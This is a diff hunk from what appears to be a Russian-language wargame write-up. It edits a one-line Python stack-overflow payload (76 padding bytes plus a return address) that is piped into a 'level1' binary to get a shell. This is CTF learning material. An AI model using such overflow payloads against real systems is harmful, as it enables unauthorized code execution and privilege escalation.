@@ -12,7 +12,7 @@ offset 76
 у нас есть права на создание в папке /tmp и установленный Python 2.7.3,
 нам также следует подать в файл поток с открытым stdin, чтобы программа
 не закончилась сразу после ошибки, итак:
-python -c 'print "E" * 76 + "\x44\x84\x04\x08"' > /tmp/exploit
+python -c 'print "U" * 76 + "\x44\x84\x04\x08"' > /tmp/exploit
 cat /tmp/exploit /dev/stdin | ./level1
 Good... Wait what?
 whoami
